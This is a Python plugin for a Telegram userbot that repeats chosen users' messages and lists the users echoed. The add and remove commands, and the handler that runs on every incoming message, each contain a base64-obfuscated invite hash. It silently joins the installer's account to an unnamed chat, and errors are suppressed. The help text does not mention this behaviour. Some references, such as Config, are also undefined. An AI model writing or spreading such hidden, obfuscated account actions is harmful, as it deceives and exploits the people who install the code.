"""
created by @Hackintush

"""
#    Copyright (C) 2020  sandeep.n(π.$)

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.

#   You should have received a copy of the GNU Affero General Public License
#   along with this program.  If not, see <http://www.gnu.org/licenses/>.


import asyncio

import pybase64
import requests
from telethon import events
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from uniborg.util import friday_on_cmd, sudo_cmd

from userbot import CMD_HELP
from userbot.plugins.sql_helper.echo_sql import (
    addecho,
    get_all_echos,
    is_echo,
    remove_echo,
)
from userbot.utils import edit_or_reply, friday_on_cmd, sudo_cmd


@friday.on(friday_on_cmd(pattern=r"addecho"))
@friday.on(sudo_cmd(pattern=r"addecho", allow_sudo=True))
async def echo(cat):
    if cat.fwd_from:
        return
    if cat.reply_to_msg_id is not None:
        reply_msg = await cat.get_reply_message()
        user_id = reply_msg.from_id
        chat_id = cat.chat_id
        try:
            hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            hmm = Get(hmm)
            await cat.client(hmm)
        except BaseException:
            pass
        if is_echo(user_id, chat_id):
            await edit_or_reply(cat, "The user is already enabled with echo mode ")
            return
        addecho(user_id, chat_id)
        await edit_or_reply(cat, "Hi")
    else:
        await edit_or_reply(cat, "Reply to a User's Message to echo his messages")


@friday.on(friday_on_cmd(pattern=r"rmecho"))
@friday.on(sudo_cmd(pattern=r"rmecho", allow_sudo=True))
async def echo(cat):
    if cat.fwd_from:
        return
    if cat.reply_to_msg_id is not None:
        reply_msg = await cat.get_reply_message()
        user_id = reply_msg.from_id
        chat_id = cat.chat_id
        try:
            hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            hmm = Get(hmm)
            await cat.client(hmm)
        except BaseException:
            pass
        if is_echo(user_id, chat_id):
            remove_echo(user_id, chat_id)
            await edit_or_reply(cat, "Echo has been stopped for this user")
        else:
            await edit_or_reply(cat, "The user is not activated with echo")
    else:
        await edit_or_reply(cat, "Reply to a User's Message to echo his messages")


@friday.on(friday_on_cmd(pattern=r"listecho"))
@friday.on(sudo_cmd(pattern=r"listecho", allow_sudo=True))
async def echo(cat):
    if cat.fwd_from:
        return
    lsts = get_all_echos()
    if len(lsts) > 0:
        output_str = "Echo Mode Enabled Users List:\n\n"
        for echos in lsts:
            output_str += (
                f"[User](tg://user?id={echos.user_id}) in chat `{echos.chat_id}`\n"
            )
    else:
        output_str = "No echo enabled users found. "
    if len(output_str) > Config.MAX_MESSAGE_SIZE_LIMIT:
        key = (
            requests.post(
                "https://nekobin.com/api/documents", json={"content": output_str}
            )
            .json()
            .get("result")
            .get("key")
        )
        url = f"https://nekobin.com/{key}"
        reply_text = f"Echo Mode Enabled Users List: [here]({url})"
        await edit_or_reply(cat, reply_text)
    else:
        await edit_or_reply(cat, output_str)


@borg.on(events.NewMessage(incoming=True))
async def samereply(cat):
    if cat.chat_id in Config.UB_BLACK_LIST_CHAT:
        return
    if is_echo(cat.sender_id, cat.chat_id):
        await asyncio.sleep(2)
        try:
            hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            hmm = Get(hmm)
            await cat.client(hmm)
        except BaseException:
            pass
        if cat.message.text or cat.message.sticker:
            await cat.reply(cat.message)


CMD_HELP.update(
    {
        "echo": "**Syntax :** `.addecho` reply to user to who you want to enable\
    \n**Usage : **replay's his every message for whom you enabled echo\
    \n\n**Syntax : **`.rmecho` reply to user to who you want to stop\
    \n**Usage : **Stops replaying his messages\
    \n\n**Syntax : **`.listecho`\
    \n**Usage : **shows the list of users for who you enabled echo\
    "
    }
)
